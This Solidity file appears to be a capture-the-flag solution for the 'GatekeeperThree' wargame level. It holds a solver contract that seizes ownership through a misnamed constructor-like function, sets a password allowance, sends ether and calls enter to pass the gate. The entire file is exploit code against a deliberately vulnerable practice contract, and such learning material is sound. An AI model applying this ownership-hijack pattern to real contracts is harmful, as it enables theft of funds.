// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function enter() external;
    function createTrick() external;
    function trick() external returns(address);
    function getAllowance(uint _password) external;
}

contract GatekeeperThreeSolver {

    IGatekeeperThree gate;

    constructor(IGatekeeperThree _gate){
        gate = _gate;
    }

    function prepare1() external {
        gate.construct0r();
        gate.createTrick();
    }
    function prepare2(uint256 password) external {
        gate.getAllowance(password);
    }

    function exploit() external payable {
        require(msg.value > 0.001 ether, "Exploit: not enough fund");
        require(payable(address(gate)).send(msg.value), "Exploit: send ether failed");
        gate.enter();
    }

}